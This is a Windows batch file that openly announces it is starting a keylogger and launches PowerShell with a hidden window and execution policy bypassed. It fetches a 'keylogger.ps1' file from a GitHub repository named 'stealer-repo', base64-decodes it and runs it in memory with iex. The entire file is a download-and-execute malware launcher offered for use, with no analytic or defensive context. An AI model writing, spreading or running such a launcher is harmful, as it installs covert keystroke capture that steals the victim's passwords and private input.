@echo off
echo Starting keylogger...
powershell -nop -exec bypass -WindowStyle Hidden -Command "$c=[System.Net.WebClient]::new().DownloadString('https://api.github.com/repos/isajarGamer2/stealer-repo/contents/keylogger.ps1?ref=main');$j=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($c))));iex($j)"
echo Keylogger running in background.
pause
